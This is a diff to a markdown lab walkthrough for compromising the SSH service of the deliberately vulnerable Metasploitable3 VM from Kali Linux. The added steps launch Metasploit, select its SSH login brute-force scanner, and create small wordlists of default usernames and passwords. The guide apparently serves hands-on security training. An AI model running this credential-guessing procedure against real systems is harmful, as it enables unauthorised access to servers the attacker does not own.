@@ -26,6 +26,16 @@ Compromise the SSH service of Metasploitable3 from Kali Linux using Metasploit a
 ## 🔍 Steps Performed
 
 ### ✅ Step 1: Start Metasploit
+Open a terminal in Kali Linux and type:
+
 ```bash
 msfconsole
+### ✅ Step 2: Select the SSH Login Scanner Module
+
+```bash
+use auxiliary/scanner/ssh/ssh_login
+### ✅ Step 3: Create Custom Wordlists
+``` bash
+echo -e "root\nmsfadmin\nuser\nadmin" > /home/kali/ssh-brute/users.txt
+echo -e "root\nmsfadmin\ntoor\n123456" > /home/kali/ssh-brute/pass.txt
 
